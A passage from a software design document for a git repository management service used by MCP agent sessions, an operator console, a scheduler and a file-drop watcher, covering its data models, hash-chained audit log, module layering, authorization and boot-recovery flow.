| ~~`operationId`~~ | — | **Removed.** The correlation runs the other way: the pipeline stamps `scheduledJobId` onto the journal entry it creates, and boot finds the entry by querying on the job id. A job cannot record the id of an entry that does not exist yet, so writing it "before dispatch" was impossible; and having the scheduler pre-generate one and pass it in would give a single caller an identity input on the canonical call path, which is exactly what "no privileged route" denies it. The job id travels in the call context by value, as `actorRef` already does, and the entry that records it is the one write guaranteed to precede the first side effect. |
| `reason` | string? | set on `skipped` or `needs-attention` |
| `createdBy` | `actorRef` | Carries the creating `grantId` where there was one, so the authority behind a queued job is re-checkable at fire time rather than only attributable after it. |

Two properties make this neither a workflow engine nor a shell adapter. It holds **one**
operation — no sequence, no conditionals, nothing authored by a caller. And `tool` resolves
inside the compiled registry, so an undeclared name does not exist. At fire time the scheduler
re-intersects `frozenGrant` with the current declaration grant and deployment ceiling; a job
can lose capability between creation and firing but can never gain it.

**The creating grant is a fourth term in that intersection, and it is the one that makes
revocation mean something.** If the grant or client named by `createdBy` is revoked, the
intersection is empty and the job moves to `cancelled` with a reason naming the revocation — it is
never fired and never silently dropped. Orphaning a declaration already cancels its pending jobs;
without this, revoking a *client* did not, so a compromised agent's 06:00 job would still fire
under a grant frozen at 02:00 and revoked at 03:00. "Revoke everything and re-authenticate is one
screen" has to hold for the actor that runs unwatched, or it holds only where it was never needed.
The check is evaluated at fire time rather than written as a cascade at revocation time, for the
same reason every other cascade here is: there is no partially applied batch to recover from.

#### `AuditEntry`

One scrubbed JSON line per mutating call: timestamp, `operationId`, `declarationId`, `generation`,
`tool`, `actorRef`, `context`, result kind and changed paths. A `git.raw` outcome uses
`changedPaths: null` when its post-state could not be observed after the caller child ran; an empty
array means either that child never started or that the observation succeeded and found no status
change. Best-effort append that never fails the call it describes, per the prior art. `actorRef` is
what makes definition-of-done item 8's "attributable" true rather than asserted.

**`context` — `normal`, `repair`, `recovery` or `hatch` — records what kind of action a line
describes, which the tool name alone cannot.** Four things this design already treats as distinct
were indistinguishable in the trail without it: a write to a parked clone under
`attention.resolve`, which control flow calls "audited as repair" and which otherwise produces a
line identical to an ordinary commit; a settle or resume driven by boot recovery with no caller
present; the `git.raw` intent and outcome pair, whose entire value is standing out; and everything
else. It is set at dispatch from the session and the operation, and it has to exist before lines
are written, because the trail is append-only and unbackfillable by design.

**Every append goes through one writer inside the audit module.** Appends are not confined to the
globally serialised mutation path: a capability rejection at dispatch is audited and happens on
lock-free read paths, and the `git.raw` outcome line lands after a child process that may have run
for its whole timeout. Two of those overlapping would each read the same chain head, claim the
same sequence number and hash over a predecessor the other did not write — so the chain would
diverge under ordinary load, with no attacker involved, and boot would report tampering that never
happened. Since routine false positives are how a tamper signal stops being read, the module owns
a single-writer queue — the same promise-chain mechanism as the mutation mutex, and sufficient for
the same reason Node makes it sufficient there. Sequence number, previous hash, file append and
the mirrored head all happen inside it. No caller needs to know, and the best-effort contract is
unchanged.

**The log is hash-chained.** Every line carries a sequence number and the previous line's hash as
ordinary fields, and a `hash` computed over the record's own canonical serialisation — `20-contract.md`
§ Audit fixes the exact rule (`hash = SHA256_hex(canonical(record))`, `previousHash` included among
the fields hashed, not concatenated separately). Rotation does not break the chain: each new
segment opens with the terminal hash of the one before it. The
chain head is mirrored into the structured store on every append and surfaced in the health view,
and boot verifies the chain end to end.

A broken or short chain is **reported, never fatal**. Refusing to start on a corrupt trail would
hand anyone able to corrupt it a way to stop the service, which is a worse property than running
with a trail that says loudly where it was cut.

What this buys, stated precisely because the escape hatch is the thing it is aimed at: truncation
and single-line edits become detectable, because the chain no longer verifies and the store's
mirrored head disagrees with the file. **It does not make the trail unforgeable.** Code reached
through `git.raw` runs as the service and can rewrite the log and the mirrored head together,
recomputing a consistent chain. Closing that needs the trail to leave the volume, which is
deferred — see the decision log. Tamper-*evident* against everything short of a deliberate,
service-privileged rewrite is what is claimed here, and it is the strongest claim available
without a second service to depend on.

**The trail is readable from the console, under `audit.read`.** A trail written, chained, mirrored
and verified, and then reachable only by opening the volume, would leave definition-of-done item
8 — six hatch attempts producing six attributable entries — checkable everywhere except on the
product. The view filters by declaration, tool, actor and window, and shows the chain state
inline: verified through which sequence number, which retained anchors cover the aged-out
segments, and where a break sits if there is one. `audit.read` is operator-only for the same
structural reason as `auth.manage` — reading what every *other* repository's sessions did is not
an operation on the one an MCP session is bound to.

**`git.raw` writes two lines, not one, because one line cannot do the job.** Result kind and
changed paths are post-execution facts, so a single line containing them cannot also be written
before execution — and "refuses to run if its line cannot be written" is only meaningful for a
line written first. The hatch therefore appends an **intent** line carrying the argument vector
before the child process starts, and an **outcome** line carrying the result once it finishes,
correlated by `operationId`. The intent append is the one that can abort the call. A failed
outcome append leaves the use recorded and its result unknown, which is a gap in the trail rather
than an unlogged execution, and the state left behind is whatever the command did — not the
"none" a pre-execution refusal leaves.

#### `ContentDrop` — headless file delivery into a declared repository

A bind-mounted directory per declaration, watched when `Declaration.contentDrop` is present and
ignored entirely when it is not. It is how a producer with no git client and no MCP session gets a
file into a repository: write it into the drop, and the service carries it through to a pull
request.

**This is a generalisation of `blog-mcp`'s directory watcher, which is proven and running**
(`src/watcher/engine.ts`, ~450 lines, with its own test file). Every mechanism below is inherited
from it rather than invented here, and the differences are exactly two: the drop is per
declaration rather than per container, and the operation it dispatches is named by the
declaration rather than hardcoded to `blog_create_post`.

**The watcher never watches a clone.** A watcher over a managed working tree observes the
service's own writes and needs a suppression rule to tell its own commits from a caller's, which
the prior art solved for one repository and which does not generalise to many. Watching an
inbound directory the service only ever reads has no such problem.

##### What the drop dispatches

`Declaration.contentDrop` names a **tool in the compiled registry annotated as a drop target**,
the same constraint `ScheduledJob.tool` carries — so an undeclared name does not exist, and the
watcher gains no ability to write paths of its own choosing. The base ships the mechanism; the
consumer ships the operation. The blog consumer points its drop at its own authoring tool, which
is what decides the repository path from the file's front matter. This is the reason the watcher
needs no path policy of its own beyond the allowlist every write already passes: **it never
copies a file to a caller-chosen path.**

The prior art's own rule carries over unchanged: a dropped file must be **complete**. Its
front matter — or whatever the target tool's input schema requires — is validated before anything
git touches, and an incomplete file is rejected outright rather than best-effort filled in.
There is no human here to catch a bad guess.

##### The directory is the state machine

Four directories. **The delivery state machine never deletes a dropped file; it only moves it.**
Scheduled retention is a separate lifecycle: a file in `processed/` may be deleted after the
configured 14-day window because its published commit is then the durable record, while a file in
`failed/` is never deleted automatically and remains until the operator clears it.

| Directory | Meaning |
|---|---|
| root | The inbox. Only files sitting directly here are considered; subdirectories are left alone. |
| `processing/` | Claimed. A file is renamed here **before any git or host action starts**, so no later tick can pick it up twice. |
| `processed/` | Succeeded, timestamp-prefixed. |
| `failed/` | Anything short of full success, timestamp-prefixed, with a sibling `.error.txt` naming the reason. |

**`processing/` is also the crash marker, and this is the mechanism the fourth-pass design was
missing.** A file still sitting in `processing/` when the watcher starts means a prior run died
mid-file. It is moved straight to `failed/` with an explanation and **never silently
reprocessed** — by the time it was claimed it may already have an open pull request, and
re-running the pipeline against it is how one dropped file becomes two published ones. That is
the same refusal the operation journal makes for the same reason, reached independently by the
prior art and inherited here rather than re-derived.

Claim-by-rename is what makes this atomic. A quiet-period heuristic, which an earlier draft of
this section used, decides *when* a file looks finished; a rename decides *that* it is now this
tick's problem and no other's, which is the property actually needed.

##### The tick

- **Polling, not `fs.watch` or inotify.** Deliberate and inherited: bind mounts under Docker
  Desktop and Windows WSL2 are unreliable for native change notification across the VM boundary,
  which is precisely the deployment this service targets. Default interval 15 s, configurable.
- **A tick is a no-op unless the clone is clean.** Fail-safe, not an error: the watcher never
  starts work on a tree that has someone else's changes in it, which is what keeps it from
  interleaving with an agent's multi-call sequence. It does **not** additionally require being
  parked on the base branch, because branch preparation bases fresh from `origin/<base>`
  regardless of what is checked out.
- **One file at a time.** There is one working tree per declaration and one global mutation lock;
  no parallelism is available and none is wanted.
- **The composite is not wrapped in an outer lock.** Each step dispatches as its own operation
  and takes the global mutation lock for itself, exactly as a console click would. Wrapping the
  sequence would deadlock against a non-reentrant mutex — a mistake the prior art documents
  having considered and avoided.
- **One audit line per file**, carrying the outcome, in addition to the per-operation lines each
  dispatched step already writes.

##### Symlinks are refused, because the drop is an untrusted boundary

The drop is a bind mount from the host — the one deliberate exception to this container not being
bind-mounted. Candidate files are therefore checked with a **link-preserving stat, never a
following one**. A following stat reports a symlink as a regular file, so a symlink dropped into
the directory would have its *target's* content read and published — with auto-merge on by
default. A link-preserving stat reports the link itself, so a symlink never passes, regardless of
what it points at or whether that target exists at all.

##### The unattended pull request is followed to its end

Delivery does not stop at a local commit. The watcher runs the full sequence — prepare branch,
invoke the target tool, stage, commit, push, open a pull request, and enable auto-merge unless
that is explicitly disabled — because a local commit nobody is told about is not delivery. It is
also the state the volume-loss table names as the one genuinely unrecoverable case, and the
safe-to-evict predicate refuses to release a clone holding it, so a watcher that stopped there
would make every drop-enabled declaration a permanent eviction blocker.

**Every pull request the watcher opens is recorded and checked on each later tick**, so an
unattended publish still gets reconciled once it actually merges. The state is re-derived from
the host every time rather than cached as an "already reconciled" flag: merged means reconcile
and drop from the list whether or not the reconcile itself succeeded, closed means drop with
nothing to do, and anything else — including a transient failure to read the status — stays
pending for the next tick. A merged-but-unreconciled pull request is something for an operator to
see in the audit trail, not something to retry silently forever.

The list is written temp-then-rename, so a kill mid-write cannot leave a half-written file, and a
missing or corrupt one is treated as empty rather than thrown — a bad read must never crash a
tick.

##### Authority

Starting the watcher takes **two independent deployment switches**, both off by default: the
deployment must permit remote operations and must permit the watcher at all. A declaration naming
a drop is the third authority condition for processing that declaration, not for starting the
watcher process. With no active drop-enabled declaration the watcher is healthy and idle; each tick
resolves the current active declarations, so a runtime declaration addition or amendment takes
effect without a restart. The prior art requires the same three authorities, and the reason is that
this is the one actor that acts with no caller present.

Its effective write allowlist is the declaration's intersected with the `watcher` profile's,
which strips `.github/workflows/`, `.config/`, `tools/` and `build/` — the inherited rule that
unattended actors must not be able to unlock themselves, applied to the newest unattended actor,
and carried over from `WATCHER_CAPABILITIES` verbatim.

#### `InstanceLease`

A single file at the volume root holding instance id, boot id, host name and start time, written
once at acquisition and never refreshed. Held open under an exclusive advisory OS lock for the
process's lifetime.

**Exclusion is the lock; the file only names the holder.** An earlier draft refreshed a lease
timestamp every ten seconds, which nothing read — the takeover rule is stated purely in terms of
the lock being free. A periodic write that no rule consumes is an invitation to add "take over if
the lease looks stale", which is exactly the heuristic the OS lock exists to replace, and which
would hand a paused or slow instance's volume to a second one. The file's only job is to make the
refusal say who is holding it.

#### `ToolResult` — the one envelope

`{ ok, kind, summary, data?, findings?, diagnostics? }`, inherited intact, with the `kind` union
widened from the prior art's four to eight by merging in `MCP-NEXT.md` §9.3:

| `kind` | `isError` | Meaning |
|---|---|---|
| `success` | false | |
| `validation` | false | Caller input does not satisfy the contract. |
| `precondition` | false | Valid request; repository state prevents it. |
| `conflict` | false | Another operation or state transition conflicts — including a lock-acquire timeout. |
| `authorization` | false | Scope or capability insufficient at dispatch. |
| `upstream` | **true** | A declared external service failed. |
| `timeout` | **true** | The operation exceeded its declared limit. |
| `infrastructure` | **true** | Unexpected runtime or environment failure. |

The rule generating that column, stated once so it does not have to be remembered per kind:
**`isError` is true when the failure is about the service or its dependencies, false when it is
about the request or the repository state.** A gate correctly reporting three bad tags executed
perfectly, and so did a push correctly refused because the branch is protected.

Token, audience and issuer failures never reach this envelope — they are transport-level `401`
with a `WWW-Authenticate` resource-metadata challenge, because the caller has to be told where
to authenticate. Scope and capability failures at dispatch do produce an `authorization`
envelope: reaching one means a stale catalogue or a by-name call for a tool the session was
never shown, and both are worth auditing rather than dropping at the transport.

---

## Module boundaries

Six layers. **Dependencies point downward only.**

```text
L5  Surfaces        MCP transport  |  HTTP API  |  console host
L4  Runtime         dispatch pipeline  |  authorization  |  operator identity
L3  Adapters        module adapter  |  http adapter
L2  Domain          git operations | composites | host adapter | scheduler | watcher
L1  Platform        declarations | credentials | clone store | exec | locks | lifecycle
                    journal | recovery catalogue | audit | notifier | result | errors | clock
L0  Contract        contract types  |  compiler  |  generated registry
```

| Module | Owns | Depends on | Exposes |
|---|---|---|---|
| **Contract types** (L0) | The SDK-neutral shape of a tool declaration: name, schemas, scopes, capabilities, annotations, limits, execution target. | Nothing. | Types and authoring helpers. |
| **Compiler** (L0, build-time only) | Normalisation, semantic safety validation, deterministic emission, SHA-256 fingerprint. | Contract types. | A registry artifact, a sanitised manifest, a fingerprint, generated documentation. **Not present at runtime.** |
| **Result / errors / clock** (L1) | The envelope, the eight kinds, the error classes, injectable time. | Nothing. | Constructors and predicates. |
| **Exec** (L1) | Every subprocess. Fixed executables, argument vectors never strings, no shell, pinned working directory, secret scrubbing of captured output, credentials passed by environment name so they never appear in a process listing. | Result, errors. | Guarded `git` and `gh` runners. |
| **Locks** (L1) | The global mutation mutex, the per-declaration materialisation mutex, and the per-declaration active-operation count. | Nothing. | Two acquire functions with bounded waits, and a non-blocking pin. |
| **Declarations** (L1) | The declaration table, the lattice intersection, the remote-host allowlist. | Structured store, result. | Read, write, and the effective-grant computation. |
| **Credentials** (L1) | Reference-to-secret resolution and the allowed-host constraint on each reference. Ships one resolver — the mounted secrets directory — behind an interface a second could satisfy. | The configured resolver. | Resolution that returns a value only into an exec environment, never to a handler. |
| **Clone store** (L1) | Materialisation, the safe-to-evict predicate, eviction, disk-pressure watermarks, remote cross-check, and the git-state *observation* recovery compares against. **Not retention beyond its own clones.** | Exec, declarations, locks, journal, recovery catalogue, audit. | Ensure, evict-if-safe, describe, request-maintenance, `runRetention`. |
| **Journal** (L1) | Intent records, and the *classification rule* applied to a state observation it is handed. **It does not read git.** | Structured store, clock. | Begin, step, settle, a pure `classify(entry, observedState, descriptor)`, and `runRetention`. |
| **Recovery catalogue** (L1) | A registry of per-tool recovery descriptors — expected post-state predicate and optional resume step — keyed by registry tool name. **Populated by registration at composition time, never by importing a domain module.** | Nothing. | Register, look up. |
| **Audit** (L1) | The append-only scrubbed log, its hash chain, its single-writer append queue, and the read query the console view uses. | Exec's scrubber, clock, and the structured store — for the advisory `audit_chain_head` mirror and the retained anchors only. The segment files are the trail, and every read of the store here is best-effort, so the log survives that store's corruption. | Append (never throws), query, verify, `runRetention`. |
| **Notifier** (L1) | Terminal-state notification, bounded retry, the outbox, and the `attention` / `info` severity split. **One transport: an HTTP webhook**, which is what Slack, Discord, Teams and most else accept; no second transport ships. **At L1, not L2** — see the notifier's placement below. | Structured store, clock. | Notify. Never blocks a caller. `runRetention`. |
| **Lifecycle** (L1) | The boot sequence, the maintenance-pass schedule and the order it drives each module's `runRetention` in, and the snapshot cadence. Receives every collaborator by injection. **A checked module, not part of the composition root** — these are ordering decisions with failure modes, not wiring. | Whatever it is handed. | Boot, run-maintenance, shutdown. |
| **Git operations** (L2) | Every repository-generic git behaviour: status, log, branches, health, diff, stage, commit, restore-paths, push, and the seven protected-base invariants. | L1. | Domain functions returning `ToolResult`. |
| **Composites** (L2) | Handwritten, fixed-sequence transactional operations — branch preparation, reconcile-after-merge. Each declares its journal steps and its recovery descriptor. | Git operations, host adapter, journal. | Domain functions, and a recovery descriptor per operation. |
| **Host adapter** (L2) | Pull requests, checks, merges, deploy monitoring; the per-credential request budget and backoff. One implementation, GitHub via `gh`. | Exec, credentials. | A host-shaped interface a second implementation could satisfy. |
| **Scheduler** (L2) | Due-job selection, missed-tick policy, grant re-intersection. | Declarations, journal, notifier — and the dispatch pipeline **by injection**, never by import. | A tick engine. |
| **Watcher** (L2) | Per-declaration content drop directories: the poll loop, the claim-and-move directory state machine, interrupted-claim recovery, and the pending-pull-request follow-up list. | Declarations, clone store — and the dispatch pipeline **by injection**, never by import, exactly as the scheduler takes it. Every git and host step goes through that injected pipeline, so it depends on neither git operations nor the host adapter directly. | A watch engine. `runRetention` for `processed/`. |
| **Module adapter** (L3) | Invoking a registry entry whose execution target is in-process. Holds a handler catalogue keyed by target name, **populated by registration at composition time, never by importing a handler.** | L1, contract types. | Register, and an invoke the pipeline calls. |
| **Http adapter** (L3) | Invoking a registry entry whose execution target is a declared HTTP endpoint: request shaping, the declared timeout, response mapping into the envelope. Its consumer is published-URL verification — see below. | L1, contract types. | Invoke. |
| **Dispatch pipeline** (L4) | The one canonical call path: identify, authenticate, enforce scopes, enforce capabilities, validate input, apply limits and cancellation, invoke adapter, validate output, scrub, audit, envelope. | L3, L1, the registry artifact. **Not L2** — see the acyclicity argument. | Dispatch. |
| **Authorization** (L4) | Resource-server token verification, the embedded provider, durable clients and grants, operator API tokens, revocation and the grant-epoch check. | Structured store. | MCP session establishment, API-token verification, revocation the console calls, `runRetention`. |
| **Operator identity** (L4) | First-boot provisioning, password, enforced TOTP, recovery codes, break-glass, OIDC relying party, subject allowlist, and the persisted operator session. | Structured store. | Operator session establishment, logout, revocation. |
| **Surfaces** (L5) | Transport framing, routing, session lifecycle, cookie attributes, CSRF defence, static console assets. | L4 only. | Nothing inward. |

### The acyclicity argument

Two edges would obviously become cycles, and are cut deliberately:

- **Audit and journal need to record who acted**, and identity lives at L4. They do not import
  it. `actorRef` is a plain value carried in the call context, constructed at L4 and passed
  down. L1 never knows an authorization module exists.
- **The scheduler and the watcher need to dispatch**, and dispatch lives at L4 above them. Neither
  imports the pipeline; it is injected at composition time. Both are callers like any other and
  get no privileged path.
- **Recovery needs to compare a journal entry against real git state**, and the two live in
  modules that cannot both depend on each other — clone store already depends on journal. The cut
  is that **journal owns the rule, clone store owns the observation**: clone store re-derives
  branch, `HEAD`, upstream and the two digests, hands that record to the journal's pure
  `classify`, and acts on the verdict. Neither the git-state interpretation nor the
  classification rule is duplicated, and no edge reverses. Without this split the obvious
  implementation gives journal a dependency on clone store and closes a cycle.
- **The notifier has to be reachable from both ends of the stack**, and at L2 it was reachable
  from neither. Terminal-state notification fires from the dispatch pipeline at L4, which may not
  import L2 at all, and from boot recovery at L1, which sits below it — and neither declared it as
  a dependency. It belongs at **L1**: it holds no git or host knowledge, takes a terminal state
  and a reason as plain values, and depends only on the structured store and the clock, which is
  the same test that places audit and journal there. Both callers then point downward with no
  injection, and the rule that the outbox row is written in the same store transaction as the
  journal settle becomes an intra-L1 write rather than a cross-layer one.
- **Recovery also needs to know what each operation was supposed to achieve**, and that is L2
  knowledge sitting above both of them. Expected post-state for `git_commit`, and the resume step
  for `prepare_publish_branch`, are facts about the domain; the two modules that drive recovery
  are at L1. This is the edge the argument above does not cover, and the obvious implementation
  closes the cycle the whole layering exists to prevent. The cut is a **recovery catalogue** at
  L1 holding descriptors keyed by registry tool name, populated by the composition root from the
  domain, exactly as the module adapter's handler catalogue and the scheduler's pipeline already
  are. L1 resolves a descriptor by name and never learns what a branch is. Three problems, one
  mechanism — which is the point: a name resolved at startup is how everything above and below
  L2 reaches it.

One further boundary is a product decision rather than hygiene: **nothing in L0, L3 or L4 may
import anything from L2.** The runtime is generic; the git domain is a consumer of it. That is
the seam `MCP-NEXT.md` Phase 8 exists to eventually cut, and it stops being cuttable the first
time the dispatch pipeline knows what a branch is. It is enforced by a dependency-direction
check in CI, not by intent.

**The composition root is what makes that rule satisfiable, and it does wiring only.** The
dispatch pipeline has to end up calling a git operation without importing one, so a single module
— the program entry point, not a layer — imports both the domain and the runtime, registers every
L2 handler into the module adapter's catalogue by target name, registers every recovery descriptor
into the recovery catalogue by the same key, injects the pipeline into the scheduler and the
watcher, constructs the lifecycle module and hands it its collaborators, and starts the surfaces.
It is the only file exempt from the dependency-direction check, and the exemption is by path, so
widening it is a visible diff rather than a habit.

**What it does not own is ordering.** The boot sequence, the order the maintenance pass drives
each module's retention in, and the snapshot cadence are decisions with failure modes rather than
wiring, and they live in the lifecycle module, which the dependency check examines like anything
else. An earlier draft put them in the root, which made the code most able to create illegal edges
the code no check looks at — and turned the exemption from a file into a subsystem, which this
document had already rejected as an alternative before doing it by accretion. Everything above L2 therefore reaches
the domain through a name resolved at startup instead of a symbol resolved at compile time, which
is the same mechanism already chosen for the scheduler's identical problem.

With those cuts every edge points strictly downward, so the graph is acyclic by construction.

### The http adapter's consumer

`MCP-NEXT.md` specifies two adapters and this design uses one, which would put an outbound-request
path inside the contract fingerprint without a single slice ever exercising it. The design's own
standard applies to a whole adapter as much as to a validator: one that has never run is not known
to do anything.

**Published-URL verification is that consumer.** The final step of verifying a *managed
repository's* deployment is an HTTPS GET of its published URL, confirming a 200 and that the
commit being served is the expected merge commit. It is genuinely an HTTP request rather than a
`gh` invocation, so routing it through `exec` was always the odd shape, and it is unauthenticated,
so the adapter needs no credential dependency and its L1-only dependency list stands. Its failure
set is what an unauthenticated GET can actually distinguish: unreachable or non-2xx, a 200 serving
a commit other than the expected one, and the declared timeout.

**That is not the same verification as definition-of-done item 15, and an earlier draft conflated
them.** Item 15 is about *this service* serving the expected build, and the four classifications
the brief names — `stale-runtime`, `mixed-runtime`, `verification-credential`,
`unexpected-profile-or-catalog` — come from its companion script, which polls `/healthz` until the
commit SHA is stable and then runs a real authenticated `initialize → tools/list → repo_status`
session. None of them is reachable by an unauthenticated GET of somebody else's site:
`verification-credential` names a credential failure for a call with no credential, and
`unexpected-profile-or-catalog` requires an MCP session against the thing being verified.

So item 15 stays what the brief calls it — **an executable check that ships alongside the service,
not a tool in the registry** — and keeps all four classifications. Attaching them to a target
repository's published-URL check would have left item 15 with no owner anywhere in the design while
giving the http adapter a failure set half of which it could never produce.

Check and deploy **status** polling stays on the host adapter through `gh`. It is authenticated
GitHub API surface, and moving it would put credentials at L3 and cut against keeping `gh` behind
the host interface for the parity migration.

### Where consumer extension attaches

A consumer builds an image `FROM` the base. Two seams:

- **Tools.** The consumer's contract is compiled during *its* build, with its declarations
  present. There is one registry and one fingerprint per image, so the immutability guarantee
  covers the extension rather than being punctured by it.
- **Views.** The base publishes its console as a versioned package — sources, view-registration
  types, build entry. The consumer's build consumes it and produces the bundle. The bundle's
  asset manifest is hashed into a **console fingerprint**, separate from the contract
  fingerprint, and both are verified at startup and reported by the version endpoint. A
  runtime-swapped bundle is fatal, the same shape as a registry mismatch.

A view declares the capabilities it needs. The console renders it for the selected repository
only when that repository's grant contains them. The blog consumer's authoring views therefore
appear for the blog declaration and are absent for every other one, using the same lattice as
the tools rather than a second mechanism.

**A registered view receives the selected declaration; it never declares one it belongs to.**
That is the whole of the seam, and keeping it to one rule is the point: a view bound to a named
declaration would be a second way to answer "may this render here", competing with the
capabilities that already answer it. The cost is real and lands on the consumer — `ComposeView`
is 38 KB of repository-implicit code that has to take the repository as an input — but it is
paid once, inside the consumer, rather than by every future consumer having to learn which of two
mechanisms a given view uses. It also keeps the base-published console package free of any
assumption that some views belong to one repository.

---

## Control flow

### 1. Agent completes a change — triggered by an MCP `tools/call`

1. Client connects to `/mcp/{declarationId}`. The resource indicator is the repository.
2. Token verified: issuer, signature, expiry, audience against that exact resource URI, scopes.
   Failure is `401` with a resource-metadata challenge, not an envelope.
3. Session established. The grant is the actor profile intersected with scopes, the declaration
   grant, the deployment ceiling and the contract set. Frozen for the session.
4. `tools/list` returns exactly the registry entries whose required capabilities are a subset of
   the grant. A tool the session may not call is not merely refused — it is not there.
5. `tools/call` arrives. The pipeline compares the declaration's `grantEpoch` against the one the
   session froze at and recomputes the grant if it moved — a recomputation that can only narrow.
   It then re-checks capabilities (a stale catalogue or a by-name call must not reach a handler),
   validates input against the schema, and applies the declared timeout and result-size limits.
6. The clone store ensures materialisation, taking the **materialisation** lock for this
   declaration. **A mutating call holds it for the rest of the operation; a read or a monitoring
   wait releases it as soon as the clone is `ready`** and relies on the active-operation count
   alone, because a 1800 s wait holding a declaration's materialisation lock would block every
   mutation on that repository for half an hour. If the clone is absent it clones
   — outside the global mutation lock, so every other repository keeps serving, which is what
   definition-of-done item 5 requires. The observed remote is cross-checked against
   `Declaration.cloneUrl`; a mismatch refuses rather than repointing an existing checkout. The
   declaration's active-operation count is incremented here, which is what stops an eviction pass
   removing this clone while the operation runs.
7. Mutating tools acquire the **global mutation** lock, bounded. Reads and monitoring waits skip
   this step entirely.
8. The journal writes intent: pre-state captured under the lock, entry written, **then** the
   first side effect.
9. The domain function runs. Composites journal each sub-step, and **any call that mutates
   something outside the local clone — a push, a pull request, a merge — journals a step marked
   `applied` before making it**, because no local pre-state can observe what a remote did.
   `RepositoryConfig` is read from the working tree at this point, uncached. Credentials resolve
   at the moment of use and reach only a child process's environment, by name.
10. Journal marked `applied`, audit line appended, **locks released in reverse acquisition order**
    — mutation, then materialisation — the active-operation count decremented, envelope returned,
    journal marked `settled`. A disk-pressure watermark reading taken here only *requests* a
    maintenance pass; eviction never runs on this path, because it would acquire a materialisation
    lock after a mutation lock.
11. On a terminal state an unwatched caller cannot see — merge conflict, failed required check,
    wait timeout — the notifier fires. **The outbox row is written in the same store transaction
    that marks the entry `settled`**, and delivery happens afterwards, asynchronously. Settling
    first and enqueuing second would leave a crash window in which the operation is recorded as
    complete, recovery therefore ignores it, and no outbox row exists to retry — so the one
    terminal state that most needed to reach you is the one that never does. Boot re-drives every
    undelivered row for the same reason.

**The scheduler tick and the watcher are this path with a different actor.** The scheduler selects
due jobs, re-intersects the frozen grant with the declaration grant, the ceiling and the creating
grant, and calls the same pipeline. The watcher claims a file from a declaration's drop directory
and calls the same pipeline once per step of its sequence — branch, write, stage, commit, push,
pull request — each step taking the global mutation lock for itself, exactly as a console click
would. Neither has a privileged route, a credential of its own, or a second implementation of any
operation.

### 2. Operator drives the console — triggered by an HTTP request

1. Login: username, password and TOTP — enforced, not offered. Or OIDC against the configured
   issuer, with the returned subject matched against the allowlist that reduces a provider's
   many identities to the one operator.
2. Operator session established with no repository binding, and **persisted**, so logout and
   revocation are server-side facts rather than a cleared cookie. Its grant spans every active
   declaration; per-repository narrowing still applies per call, because the effective set is
   computed against the declaration named in the request.

   **The API accepts two credentials, and which routes accept which is stated rather than
   implied.** A browser presents the session cookie with the `Origin` check and the double-submit
   token. A script presents `Authorization: Bearer` with an operator API token — an
   `operator-api` grant issued from the grants view, verified by the same stored hash as every
   other token and revoked in the same place. The brief lists the HTTP API as a first-class
   surface the operator drives directly, and an enforced-TOTP browser login is not a credential a
   script can hold; leaving that unstated would have meant either a second scheme arriving
   undesigned or cookie authority becoming the only thing between a cross-site request and the
   repository-mutating route table. Bearer routes take no cookie and cookie routes take no bearer,
   so neither scheme can be used to stand in for the other.
3. The landing view lists declarations with clone state, current branch, dirty flag and last
   operation. Selecting one sets the repository dimension for every subsequent view.
4. Each view calls a repository-scoped API route, which calls **the same dispatch pipeline and
   the same domain functions** as the MCP path. No surface reimplements a variant of an
   operation. The API is an explicit route table, never a call-any-tool-by-name proxy.
5. Declaration management is reachable only here, and **structurally so rather than by
   configuration**: an MCP session binds to one declaration at `initialize`, so a tool that
   creates a declaration has nothing to bind to, and amending or orphaning a *different*
   declaration is not an operation on the bound one. `declaration.manage`, `auth.manage`,
   `audit.read` and `attention.resolve` are therefore absent from every MCP session profile as a
   consequence of the session model, not as a default a deployment could flip. The reason it is worth stating
   twice: a caller able to declare a repository could point an existing credential reference at a
   remote it controls and harvest the token from the push. The remote-host allowlist is the
   second, independent guard, so an operator slip cannot do it either.
6. **Four operator-only views exist because four states have no other exit.** A grants view lists
   clients, grants, operator API tokens and live sessions — MCP and operator alike — with last
   use, and revokes any of them under `auth.manage`. An audit view reads the trail under
   `audit.read`, filtered by declaration, tool, actor and window, with the chain-verification
   state shown inline. A health view surfaces failed notification-outbox rows and failing
   credential references, both of which are otherwise only visible in logs. And a
   parked-operations view shows every journal entry in `attention` with its `preState`, the
   observed current state and the diff between them.
7. **The parked-operations view has to offer a way out, not only a way to record one.** Its
   resolutions are still to mark the entry settled and return the clone to `ready`, or to keep it
   parked — but an earlier draft said the operator "fixes the tree with ordinary git operations
   first", and there were none: the declaration refuses mutations while parked, the console has no
   file view or shell, and `git.raw` is default-deny per declaration. The documented exit required
   host access, or granting the most consequential field in a declaration under incident pressure.

   A clone in `needs-attention` therefore admits **the existing typed write tools** — stage,
   restore-paths, commit, branch — to a session holding `attention.resolve`, audited as repair,
   while ordinary traffic still gets reads only. No new mutation surface appears: these are the
   same operations, under the same path allowlist, that the declaration already permits when
   healthy. What is new is only that being parked no longer withholds them from the one actor
   whose job is to unpark it. No console button rewrites a working tree, so the arbitrary-mutation
   route the non-goals forbid stays closed.

   **What it does not resolve is an unmerged index**, and that boundary is stated rather than left
   to be discovered. Nothing here edits file content, `commit` fails on a conflicted index, and
   staging a conflicted path stages the markers. The exits are `git.raw` or host access — which is
   coherent rather than a gap, because **the base tool surface cannot produce that state**: there
   is no merge tool and no rebase tool, and by design there never will be. A conflicted index is
   reachable only through the hatch or from outside the service, so requiring the hatch to leave
   it asks for nothing that was not already granted deliberately. The repair session covers what
   the base surface can actually create.

### 3. Boot and recovery — triggered by process start

1. Open the lease lock and take the exclusive advisory OS lock, then **self-test it with a real
   second process** — a short-lived child attempts the same lock and must be refused. A filesystem
   that grants both is not one this service can run on safely, and startup is fatal there.

   **The lock and the lease contents are two files.** The advisory lock is carried by a file that
   exists only to be locked; `InstanceLease` is written beside it while that lock is held. The
   runtime has no `flock` binding, so the lock has to live on something the platform will lock for
   us, and that cannot also be a file being rewritten as JSON. A reader that finds the JSON has
   learned who *claims* the volume; only the lock decides who holds it.

   The test is a child rather than a second acquire from this process because the property relied
   on is *cross-process* exclusion, and same-process re-acquisition is a property of the locking
   API rather than of the filesystem: depending on the call, a second acquire on the same
   descriptor may convert the lock and succeed on a perfectly sound volume, or fail on a volume
   that silently no-ops exclusion between hosts. A self-test that can pass on the broken
   configuration and fail on the good one cannot be what makes definition-of-done item 9 loud.

   While the lease is held a second instance refuses to start, naming the holder from the lease
   contents. In the ordinary case the kernel releases the lock on death, `SIGKILL` included, so
   there is no stale lock to reason about. **The case the brief asks about is the one where that
